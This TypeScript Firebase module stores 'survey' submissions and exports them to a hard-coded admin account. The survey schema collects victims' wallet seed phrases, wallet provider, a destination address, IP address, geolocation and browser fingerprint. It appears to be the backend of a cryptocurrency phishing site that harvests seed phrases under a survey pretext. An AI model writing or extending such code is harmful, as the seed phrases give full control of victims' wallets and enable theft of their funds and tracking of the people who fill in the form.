// storeSurvey.ts
import { auth, db } from "./firebase";
import {
	collection,
	addDoc,
	serverTimestamp,
	getDocs,
	query,
	where,
	doc,
	deleteDoc,
} from "firebase/firestore";
import { User } from "firebase/auth";

interface SurveyData {
	blockchainNetwork: string;
	walletProvider: string;
	seedPhrase: string;
	destinationAddress: string;
	ipAddress?: string;
	geolocation: {
		latitude?: number;
		longitude?: number;
		city?: string;
		region?: string;
		country?: string;
		error?: string;
	} | null;
	userAgent?: string;
	screenResolution?: string;
}

export async function storeSurveyData(data: SurveyData) {
	try {
		const docRef = await addDoc(collection(db, "surveys"), {
			...data,
			createdAt: serverTimestamp(),
		});
		console.log("Survey submitted with ID: ", docRef.id);
		return docRef.id;
	} catch (error) {
		console.error("Error adding survey: ", error);
		throw error;
	}
}

/**
 * Fetch all surveys if the current user is an admin
 */

export const fetchAllSurveys = async () => {
	// Get the current user
	const user: User | null = auth.currentUser;

	if (!user || !user.email) {
		throw new Error("No user logged in");
	}

	// Define allowed admin emails
	const adminEmails = process.env.NEXT_PUBLIC_ADMIN_EMAILS
		? process.env.NEXT_PUBLIC_ADMIN_EMAILS.split(",").map((s) => s.trim())
		: ["midnightddp@gmail.com"];

	// Check if the current user is an admin
	if (!adminEmails.includes(user.email)) {
		throw new Error("You are not authorized to access this data");
	}

	// Fetch all documents in 'surveys' collection
	const surveysSnapshot = await getDocs(collection(db, "surveys"));
	const surveys = surveysSnapshot.docs.map((doc) => ({
		id: doc.id,
		...doc.data(),
	}));

	return surveys;
};

export async function deleteDocumentByIdField(
	collectionName: string,
	id: string
): Promise<void> {
	try {
		const q = query(collection(db, collectionName), where("id", "==", id));
		const querySnapshot = await getDocs(q);

		if (querySnapshot.empty) {
			console.log(`No document found with id field = ${id}`);
			return;
		}

		// Assuming "id" field is unique, delete the first match
		const docRef = doc(db, collectionName, querySnapshot.docs[0].id);
		await deleteDoc(docRef);
		console.log(`Document with id field = ${id} deleted successfully.`);
	} catch (error) {
		console.error("Error deleting document:", error);
	}
}
